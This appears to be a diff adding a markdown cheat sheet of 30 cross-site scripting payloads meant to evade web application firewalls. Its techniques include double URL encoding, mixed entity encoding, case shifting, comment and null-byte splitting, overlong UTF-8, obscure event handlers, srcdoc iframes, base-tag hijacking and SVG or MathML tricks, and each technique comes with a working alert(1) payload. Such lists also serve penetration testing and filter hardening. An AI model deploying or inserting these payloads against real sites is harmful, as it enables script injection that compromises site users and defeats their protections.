@@ -1,0 +1,243 @@
+1. **Double Decode Ritual**
+
+   - Payload is URL‑encoded twice so the backend decodes twice before execution.
+   - Example:
+     ```
+     %253Csvg%252Fonload%253Dalert(1)%253E
+     ```
+
+2. **Mixed Encoding Polyglot**
+
+   - Combine HTML entities, decimal, hex, and UTF‑8 in one payload to break regex matching.
+   - Example:
+     ```
+     &#x3C;svg&#x2F;onload&#x3D;alert&#x28;1&#x29;&#x3E;
+     ```
+
+3. **Case‑Shifting Confusion**
+
+   - WAF is case‑sensitive; mix upper/lower case in tag/attribute names.
+   - Example:
+     ```
+     <SvG oNlOaD=alert(1)>
+     ```
+
+4. **Comment Injection Split**
+
+   - Break up keywords with HTML comments so browser recombines but WAF doesn’t.
+   - Example:
+     ```
+     <svg/on<!-- -->load=alert(1)>
+     ```
+
+5. **Null Byte Padding**
+
+   - Insert `%00` or `\x00` to break WAF tokenization but not browser parsing.
+   - Example:
+     ```
+     <svg%00onload=alert(1)>
+     ```
+
+6. **Overlong UTF‑8 Encoding** _(legacy parsers)_
+
+   - Encode `<` as overlong UTF‑8 sequence to bypass naive decoders.
+   - Example:
+     ```
+     %C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
+     ```
+
+7. **Attribute Re‑Order Trick**
+
+   - WAF expects `src` before `onerror`; reverse them.
+   - Example:
+     ```
+     <img onerror=alert(1) src=x>
+     ```
+
+8. **Event Handler Alias**
+
+   - Use lesser‑known event attributes instead of `onload`/`onerror`.
+   - Example:
+     ```
+     <svg onbegin=alert(1)>
+     ```
+
+9. **Protocol Smuggling**
+
+   - Hide `javascript:` in a data URI or base64.
+   - Example:
+     ```
+     <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+     ```
+
+10. **Whitespace Mutation**
+
+    - Replace spaces with tabs, newlines, or Unicode spaces.
+    - Example:
+      ```
+      <img src=x onerror=alert(1)>
+      ```
+
+11. **Tag Inside Tag**
+
+    - Nest harmless tag inside executable tag to break pattern matching.
+    - Example:
+      ```
+      <svg><desc></desc><script>alert(1)</script></svg>
+      ```
+
+12. **Broken Tag Healing**
+
+    - Inject incomplete tag that browser auto‑closes, but WAF ignores.
+    - Example:
+      ```
+      <svg/onload=alert(1)
+      ```
+
+13. **JS Keyword Fragmentation**
+
+    - Break `alert` into concatenated strings.
+    - Example:
+      ```html
+      <script>
+        al/*foo*/ert(1)
+      </script>
+      ```
+
+14. **HTML5 Obscure Tags**
+
+    - Use tags WAF doesn’t monitor but browsers execute events from.
+    - Example:
+      ```
+      <details ontoggle=alert(1)>
+      ```
+
+15. **CSS Escape to JS** _(legacy)_
+
+    - Use CSS `expression()` or `url(javascript:)` in style attributes.
+    - Example:
+      ```
+      <div style="background:url(javascript:alert(1))">
+      ```
+
+16. **Over‑Long Attribute Values**
+
+    - Pad attribute with junk to exceed WAF regex length limit.
+    - Example:
+      ```
+      <img src="xaaaaaaaaaaaaa...[long]..." onerror=alert(1)>
+      ```
+
+17. **HTML Entity Over‑Decoding**
+
+    - Use double‑encoded entities that decode twice in browser.
+    - Example:
+      ```
+      &amp;#x3C;script&amp;#x3E;alert(1)&amp;#x3C;/script&amp;#x3E;
+      ```
+
+18. **DOM‑Only Payload**
+
+    - WAF filters server‑side HTML, but injection happens in JS variable.
+    - Example:
+      ```js
+      var x = "<img src=x onerror=alert(1)>";
+      document.body.innerHTML = x;
+      ```
+
+19. **Attribute Injection via Template**
+
+    - Inject into a template string that becomes an attribute value.
+    - Example:
+      ```
+      " autofocus onfocus=alert(1) x="
+      ```
+
+20. **Multi‑Context Escape**
+
+    - Start in HTML, escape to JS, then back to HTML.
+    - Example:
+      ```
+      "><script>document.write('<img src=x onerror=alert(1)>')</script>
+      ```
+
+21. **Event Attribute Encoding Drift**
+
+    - Encode part of an event name so WAF sees a harmless token, browser recombines.
+    - Example:
+      ```
+      <img src=x onerr&#x6f;r=alert(1)>
+      ```
+
+22. **SVG Animation Abuse**
+
+    - Use `<animate>` or `<set>` with `onbegin` or `href="javascript:..."`.
+    - Example:
+      ```
+      <svg><animate attributeName="x" begin="0s" dur="1s" onbegin="alert(1)"></animate></svg>
+      ```
+
+23. **Srcdoc Iframe Injection**
+
+    - WAF inspects `src` but ignores `srcdoc` attribute.
+    - Example:
+      ```
+      <iframe srcdoc="<script>alert(1)</script>">
+      ```
+
+24. **MathML Event Handlers**
+
+    - Use MathML tags with JS‑capable attributes.
+    - Example:
+      ```
+      <math><maction actiontype="statusline#javascript:alert(1)"></maction></math>
+      ```
+
+25. **Base Tag Context Switch**
+
+    - Inject `<base>` to change relative URL resolution to `javascript:`.
+    - Example:
+      ```
+      <base href="javascript:alert(1)//">
+      <a href="#">click</a>
+      ```
+
+26. **Form Action Smuggle**
+
+    - Use `form` action with `javascript:` URI.
+    - Example:
+      ```
+      <form action="javascript:alert(1)"><input type=submit>
+      ```
+
+27. **Meta Refresh to JS**
+
+    - Use `<meta>` refresh to jump to `javascript:`.
+    - Example:
+      ```
+      <meta http-equiv="refresh" content="0;javascript:alert(1)">
+      ```
+
+28. **ForeignObject in SVG**
+
+    - Embed HTML inside `<foreignObject>` in SVG to hide script from naive HTML parsers.
+    - Example:
+      ```
+      <svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>
+      ```
+
+29. **MIME Sniffing Pivot**
+
+    - Upload non‑HTML file with HTML payload, rely on browser sniffing to execute.
+    - Example:
+      ```
+      <iframe src="/uploads/payload.txt"></iframe>
+      ```
+
+30. **Obscure Named Entities**
+
+    - Use rare HTML entities like `&Tab;` or `&NewLine;` to split dangerous tokens.
+    - Example:
+      ```
+      <img&Tab;src=x&NewLine;onerror=alert(1)>
+      ```
